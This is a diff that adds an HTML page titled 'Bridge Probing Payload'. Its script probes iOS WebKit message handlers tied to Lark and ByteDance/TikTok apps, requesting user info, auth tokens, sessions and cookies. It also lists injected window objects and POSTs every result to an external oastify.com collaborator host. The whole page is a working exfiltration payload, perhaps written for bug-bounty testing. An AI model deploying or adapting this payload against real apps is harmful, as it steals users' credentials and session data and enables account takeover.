@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bridge Probing Payload</title>
+</head>
+<body>
+    <h1>Probing Native Bridges...</h1>
+    <script>
+        // A helper function to log output back to you (e.g., via a webhook or just alert)
+        function exfiltrate(data) {
+            // alert(JSON.stringify(data)); 
+            fetch('https://bze14eeug2h754wy1mnaysybq2wtkj88.oastify.com', {
+                method: 'POST',
+                body: JSON.stringify(data)
+            });
+        }
+
+        // 1. Probe the standard 'invoke' handlers
+        const potentialHandlers = ['invoke', 'invokeNative', 'rangersapplog_ios_h5bridge_message_handler', 'lark', 'ttbridge'];
+        const potentialMethods = ['getUserInfo', 'getAuthToken', 'getSession', 'getCookies', 'requestToken'];
+
+        for (const handler of potentialHandlers) {
+            if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers[handler]) {
+                for (const method of potentialMethods) {
+                    try {
+                        // iOS bridges usually expect a dictionary/object
+                        window.webkit.messageHandlers[handler].postMessage({
+                            "method": method,
+                            "action": method,
+                            "apiName": method,
+                            "callback": "exfiltrate" // Tell the native app to pass the result back to our function
+                        });
+                        exfiltrate({status: `Called ${handler} with ${method}`});
+                    } catch (e) {
+                        // Ignore errors if the structure is wrong
+                    }
+                }
+            }
+        }
+
+        // 2. Dump all window properties looking for injected SDKs
+        let injectedObjects = [];
+        for (let prop in window) {
+            if (prop.toLowerCase().includes('lark') || 
+                prop.toLowerCase().includes('tt') ||    // TikTok/ByteDance prefix
+                prop.toLowerCase().includes('bytedance') || 
+                prop.toLowerCase().includes('bridge')) {
+                injectedObjects.push(prop);
+            }
+        }
+        if (injectedObjects.length > 0) {
+            exfiltrate({injected_window_objects: injectedObjects});
+        }
+    </script>
+</body>
+</html>
